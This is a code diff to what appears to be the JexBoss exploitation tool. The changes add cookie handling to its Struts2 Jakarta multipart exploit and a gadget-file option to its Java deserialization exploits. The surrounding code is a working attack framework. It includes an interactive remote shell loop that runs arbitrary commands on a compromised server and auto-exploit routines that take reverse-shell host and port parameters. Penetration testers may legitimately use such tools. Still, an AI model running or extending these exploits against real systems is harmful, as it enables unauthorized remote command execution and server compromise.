@@ -339,7 +339,7 @@ def check_vul(url):
                 r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
                 if r.status in (301, 302, 303, 307, 308):
                     cookie = r.getheader('set-cookie')
-                    headers['Cookie'] = cookie
+                    if cookie is not None: headers['Cookie'] = cookie
                     r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
 
                 if 'x-java-serialized-object' in r.getheader('Content-Type'):
@@ -349,7 +349,7 @@ def check_vul(url):
 
             elif vector == 'Struts2':
 
-                result = _exploits.exploit_struts2_jakarta_multipart(url, 'jexboss')
+                result = _exploits.exploit_struts2_jakarta_multipart(url, 'jexboss', gl_args.cookies)
                 if result is None or "Could not get command" in str(result) :
                     paths[vector] = 100
                 elif 'jexboss' in str(result) and "<html>" not in str(result).lower():
@@ -525,7 +525,8 @@ def auto_exploit(url, exploit_type):
             host, port = get_host_port_reverse_params()
             if host == port == gl_args.cmd == None: return False
             result = _exploits.exploit_servlet_deserialization(url + "/web-console/Invoker", host=host, port=port,
-                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget)
+                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,
+                                                               gadget_file=gl_args.load_gadget)
     elif exploit_type == "JMXInvokerServlet":
 
         # if the user not provided the path
@@ -539,7 +540,8 @@ def auto_exploit(url, exploit_type):
             host, port = get_host_port_reverse_params()
             if host == port == gl_args.cmd == None: return False
             result = _exploits.exploit_servlet_deserialization(url + "/invoker/JMXInvokerServlet", host=host, port=port,
-                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget)
+                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,
+                                                               gadget_file=gl_args.load_gadget)
 
     elif exploit_type == "admin-console":
 
@@ -684,7 +686,7 @@ def shell_http_struts(url):
                     )
     print_and_flush("# ----------------------------------------- #\n")
 
-    resp = _exploits.exploit_struts2_jakarta_multipart(url,'whoami')
+    resp = _exploits.exploit_struts2_jakarta_multipart(url,'whoami', gl_args.cookies)
 
     print_and_flush(resp.replace('\\n', '\n'), same_line=True)
     logging.info("Server %s exploited!" %url)
@@ -701,7 +703,7 @@ def shell_http_struts(url):
         if cmd == "exit":
             break
 
-        resp = _exploits.exploit_struts2_jakarta_multipart(url, cmd)
+        resp = _exploits.exploit_struts2_jakarta_multipart(url, cmd, gl_args.cookies)
         print_and_flush(resp.replace('\\n', '\n'))
 
 
@@ -1080,6 +1082,10 @@ if __name__ == "__main__":
     parser.add_argument('--jboss-login', "-J", help="JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 "
                                                     "(default: admin:admin)", metavar='LOGIN:PASS', default='admin:admin')
     parser.add_argument('--timeout', help="Seconds to wait before timeout connection (default 3)", default=3, type=int)
+
+    parser.add_argument('--cookies', help="Specify cookies for Struts 2 Exploit. Use this to test features that require authentication. "
+                                         "Format: \"NAME1=VALUE1; NAME2=VALUE2\" (eg. --cookie \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\""
+                        , type=str, metavar='NAME=VALUE')
     #parser.add_argument('--retries', help="Retries when the connection timeouts (default 3)", default=3, type=int)
 
     # advanced parameters ---------------------------------------------------------------------------------------
